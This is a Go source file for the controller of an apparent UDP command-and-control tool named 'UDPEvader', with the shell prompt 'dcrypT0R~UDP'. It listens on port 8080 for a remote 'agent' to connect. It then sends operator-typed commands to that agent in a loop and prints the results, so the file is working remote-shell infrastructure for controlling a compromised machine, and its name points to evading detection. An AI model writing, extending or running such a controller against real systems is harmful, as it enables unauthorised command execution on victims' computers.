package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"UDPEvader/src/listenerprops"

	"github.com/fatih/color"
)

const BUFFSIZE = 1024

func main() {
	bl := color.New(color.FgHiBlue, color.Bold)
	ylw := color.New(color.FgHiYellow, color.Bold)
	cyan := color.New(color.FgHiCyan, color.Bold)

	listenerprop := listenerprops.UDPListenerProps{
		UDPPort:    ":8080",
		ShellPrmpt: "<<@dcrypT0R~UDP>>",
	}
	udpconn, err := listenerprop.StartUDPController()
	if err != nil {
		fmt.Println("UDP Controller error", err)
	}
	listenerprop.AgentConn = udpconn
	defer listenerprop.AgentConn.Close()
	ylw.Printf("Waiting for dcrypT0R UDP agent...")
	listenerprop.ReceivedResult = make([]byte, BUFFSIZE)
	_, clientaddr, err := listenerprop.AgentConn.ReadFromUDP(listenerprop.ReceivedResult)
	if err != nil {
		fmt.Println(err)
	}
	cyan.Println("Agent connected ", clientaddr)

	for {

		bl.Printf(listenerprop.SetControllerPrompt())
		reader := bufio.NewReader(os.Stdin)
		command, _ := reader.ReadString('\n')

		_, err = listenerprop.AgentConn.WriteToUDP([]byte(command), clientaddr)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 1)
		listenerprop.ReadResultandPrint()
	}
}
